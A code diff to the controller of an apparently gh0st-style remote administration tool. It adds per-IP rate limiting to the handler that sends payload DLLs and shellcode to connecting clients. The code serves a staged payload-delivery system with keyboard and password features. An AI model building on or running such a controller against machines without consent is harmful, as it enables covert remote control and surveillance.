@@ -20,6 +20,7 @@
 #include "ServicesDlg.h"
 #include "VideoDlg.h"
 #include <vector>
+#include <map>
 #include "KeyBoardDlg.h"
 #include "InputDlg.h"
 #include "CPasswordDlg.h"
@@ -68,6 +69,9 @@
 #define TODO_NOTICE MessageBoxL("This feature has not been implemented!\nPlease contact: 962914132@qq.com", "提示", MB_ICONINFORMATION);
 #define TINY_DLL_NAME "TinyRun.dll"
 #define FRPC_DLL_NAME "Frpc.dll"
+
+// DLL 请求限流：每个 IP 在指定时间内只能成功接收一次 DLL
+#define DLL_RATE_LIMIT_SECONDS 3600  // 1 小时
 
 typedef struct {
     const char*   szTitle;     //列表的名称
@@ -480,6 +484,7 @@ CMy2015RemoteDlg::~CMy2015RemoteDlg()
 {
     SAFE_DELETE(m_ClientMap);
     DeleteCriticalSection(&m_cs);
+    DeleteCriticalSection(&m_DllRateLimitLock);
     for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
         SAFE_DELETE(m_ServerDLL[i]);
         SAFE_DELETE(m_ServerBin[i]);
@@ -495,6 +500,29 @@ CMy2015RemoteDlg::~CMy2015RemoteDlg()
         m_FileServer->Stop();
         SAFE_DELETE(m_FileServer);
     }
+}
+
+// DLL 请求限流成员函数实现
+bool CMy2015RemoteDlg::IsDllRequestLimited(const std::string& ip)
+{
+    CLock lock(m_DllRateLimitLock);
+
+    auto it = m_DllRequestTime.find(ip);
+    if (it != m_DllRequestTime.end()) {
+        time_t elapsed = time(nullptr) - it->second;
+        if (elapsed < DLL_RATE_LIMIT_SECONDS) {
+            Mprintf("'%s' DLL request rate limited (last request %lld seconds ago)\n",
+                    ip.c_str(), (long long)elapsed);
+            return true;
+        }
+    }
+    return false;
+}
+
+void CMy2015RemoteDlg::RecordDllRequest(const std::string& ip)
+{
+    CLock lock(m_DllRateLimitLock);
+    m_DllRequestTime[ip] = time(nullptr);
 }
 
 void CMy2015RemoteDlg::DoDataExchange(CDataExchange* pDX)
@@ -1223,6 +1251,8 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
     m_superPass = env ? env : "";
     AUTO_TICK(500, "");
     __super::OnInitDialog();
+
+    InitializeCriticalSection(&m_DllRateLimitLock);  // DLL 请求限流
 
     // 添加 WS_CLIPCHILDREN 样式，防止父窗口重绘时覆盖子控件，减少闪烁
     ModifyStyle(0, WS_CLIPCHILDREN);
@@ -3738,9 +3768,22 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
         bool isRelease = len > 3 ? ContextObject->InDeCompressedBuffer.GetBYTE(3) : true;
         char version[12] = {};
         ContextObject->InDeCompressedBuffer.CopyBuffer(version, 12, 4);
-        BOOL send = SendServerDll(ContextObject, typ==MEMORYDLL, is64Bit);
-        Mprintf("'%s' Request %s [is64Bit:%d isRelease:%d] SendServerDll: %s\n", ContextObject->RemoteAddr().c_str(),
-                typ == SHELLCODE ? "SC" : "DLL", is64Bit, isRelease, send ? "Yes" : "No");
+
+        std::string clientIP = ContextObject->RemoteAddr();
+        BOOL send = FALSE;
+
+        // 检查是否被限流（只限制真实发送 DLL 的请求）
+        if (IsDllRequestLimited(clientIP)) {
+            Mprintf("'%s' Request %s [is64Bit:%d isRelease:%d] SendServerDll: RateLimited\n",
+                    clientIP.c_str(), typ == SHELLCODE ? "SC" : "DLL", is64Bit, isRelease);
+        } else {
+            send = SendServerDll(ContextObject, typ==MEMORYDLL, is64Bit);
+            if (send) {
+                RecordDllRequest(clientIP);  // 只有真正发送了才记录
+            }
+            Mprintf("'%s' Request %s [is64Bit:%d isRelease:%d] SendServerDll: %s\n",
+                    clientIP.c_str(), typ == SHELLCODE ? "SC" : "DLL", is64Bit, isRelease, send ? "Yes" : "No");
+        }
         break;
     }
     case COMMAND_BYE: { // 主机下线【L】
